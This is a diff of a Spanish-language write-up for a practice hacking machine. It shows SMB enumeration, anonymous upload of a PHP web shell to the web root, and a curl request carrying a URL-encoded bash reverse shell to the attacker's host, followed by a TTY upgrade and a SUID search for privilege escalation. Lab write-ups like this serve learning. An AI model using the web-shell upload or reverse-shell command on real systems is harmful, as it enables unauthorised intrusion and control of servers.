@@ -74,6 +74,8 @@ Host script results:
 
 ### Smbmap (puerto 445)
 
+Usaré smbmap para ver que contiene el servicio smb.
+
 ```bash
 ❯ smbmap -H 192.168.1.55
 
@@ -85,7 +87,7 @@ Host script results:
 	   IPC$                                              	NO ACCESS	IPC Service (Private Share for uploading files)
 ```
 
-Usamos `smbclient` para conectarnos a `share`, dentro vemos un directorio llamado html.
+Con `smbclient` me conectaré a `share`, dentro veo un directorio llamado html.
 ```bash
 ❯ smbclient -N //192.168.1.55/share
 Anonymous login successful
@@ -106,51 +108,51 @@ smb: \html\> ls
 smb: \html\>
 ```
 
-Descargamos `index.html` y vemos que es la página por defecto de apache2
+Descargo `index.html` y veo que es la página por defecto de apache.
 
 ![](/assets/images/hmvm-Connection/apache2.png)
 
-Ahora crearemos un archivo de texto para subirlo en el directorio `html` del servidor `samba`
+Ahora creo un archivo de texto para subirlo al directorio `html` del servidor samba.
 ```bash
 ❯ touch test.txt
 ❯ nano test.txt
 ```
 
-Nos conectamos de nuevo a samba y nos movemos al directorio html para subir nuestro archivo.
+Me conecto de nuevo a samba y nos me voy al directorio html para subir el archivo.
 
 ![](/assets/images/hmvm-Connection/subidaArchivotxt.png)
 
-Abrimos nuestro navegador y nos vamos a la siguiente dirección: `http://192.168.1.55/test.txt`
+Abro firefox y me voy a: `http://192.168.1.55/test.txt`
 
 ![](/assets/images/hmvm-Connection/archivotxtOk.png)
 
-Ahora creamos un archivo php malicioso para subirlo al directorio html y comprobar si la web interpreta código php.
+Ahora creo un archivo php malicioso para subirlo al directorio html y comprobar si la web interpreta código php.
 ```bash
 ❯ touch shell.php
 ❯ nano shell.php
 ```
 ![](/assets/images/hmvm-Connection/shellphp.png)
 
-Subimos la shell:
+Subo la shell:
 
 ![](/assets/images/hmvm-Connection/subidaShell.png)
 
-Volvemos a `http://192.168.1.55` y vemos que nos interpreta código php como usuario `www-data`
+Vuelvo a `http://192.168.1.55` y veo que interpreta código php como usuario "www-data".
 
 ![](/assets/images/hmvm-Connection/webInterpretaphp.png)
 
-Ponemos un netcat a la escucha para obtener una shell de la máquina objetivo.
+Pongo un netcat a la escucha para obtener una shell de la máquina objetivo.
 
 `nc -lvnp 1234`
 
-Usamos curl para tener la ejecución remota de comandos (RCE).
+Uso curl para tener la ejecución de comandos.
 
 `curl -s http://192.168.1.55/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.42%2F1234%200%3E%261%22`
 
 ![](/assets/images/hmvm-Connection/shellok.png)
 
 ### TTY
-Ahora hacemos un tratamiento de la tty para tener nuestra shell interactiva.
+ÇHago el tratamiento de la tty para tener una shell interactiva.
 ```bash
 script /dev/null -c bash
 ctrl+z
@@ -161,14 +163,14 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-Con el ususario www-data podemos leer la flag del usuario.
+Con el ususario www-data puedo leer la flag del usuario.
 ```bash
 # cat local.txt
 3f49xxxxxxxxxxxxxxxxxxxxxxxx9617
 ```
 
 ### Privesc
-Con find buscaremos todos los binarios con permisos SUID.
+Con find busco todos los binarios con permisos SUID.
 ```bash
 www-data@connection:/var/www/html$ find / -perm -4000 2>/dev/null
 /usr/lib/eject/dmcrypt-get-device
@@ -197,7 +199,7 @@ Obtenemos el root.
 
 ![](/assets/images/hmvm-Connection/root.png)
 
-Una vez como root ya podemos leer la flag de root
+Una vez como root ya podemos leer la flag de root.
 
 ```bash
 # cat proof.txt
